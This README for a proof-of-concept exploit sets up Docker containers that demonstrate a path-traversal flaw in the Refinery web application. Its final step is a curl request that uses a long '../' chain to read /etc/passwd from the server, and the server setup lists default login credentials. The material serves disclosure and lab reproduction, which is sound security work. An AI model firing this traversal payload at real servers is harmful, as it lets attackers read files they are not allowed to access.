# Path injection in Refinery

This directory contains a proof-of-concept exploit for a path injection vulnerability in [Refinery](https://github.com/daeilkim/refinery).

To demonstrate the PoC in a safe environment, we will use two docker containers connected by a docker network bridge to simulate two separate computers: the first is the Refinery server and the second is the attacker's computer.

We have tried to make the `Dockerfile`'s for the server and attacker as simple as possible, to make it clear that we have used vanilla [Ubuntu 18.04](http://releases.ubuntu.com/18.04/) with no unusual packages installed.

## Network setup

Create a docker network bridge, to simulate a network with two separate computers.

```bash
docker network create -d bridge --subnet 172.18.0.0/16 refinery-demo-network
```

## Refinery server setup

Build the docker image:

```bash
cd refinery-server
docker build . -t refinery-server --build-arg UID=`id -u`
```

Start the container:

```bash
docker run --rm --network refinery-demo-network --ip=172.18.0.10 -h refinery-server --publish 8080:8080 -i -t refinery-server
```

Inside the container, start postgresql and Refinery.

```bash
sudo service postgresql start  # sudo password is "x"
sudo -u postgres createuser --superuser victim
sudo -u postgres createdb refinery
cd refinery/refinery
./reset_db.py
./start_refinery.sh
```

At this point, you can check that Refinery is running by visiting [http://127.0.0.1:8080](http://127.0.0.1:8080) in your browser. (We exposed port 8080 on the docker container.) You should see a login screen. These are the default credentials:

```
username: doc
password: refinery
```

## Attacker setup

Build the docker image:

```bash
cd refinery-attacker
docker build . -t refinery-attacker
```

Start the container:

```bash
docker run --rm --network refinery-demo-network --ip=172.18.0.11 -h refinery-attacker -i -t refinery-attacker
```

Inside the container, use `curl` to read arbitrary files on the server:

```bash
curl -d "filename=../../../../../../../../../../../../../../etc/passwd" -X POST http://172.18.0.10:8080/doc/get_doc_text
```
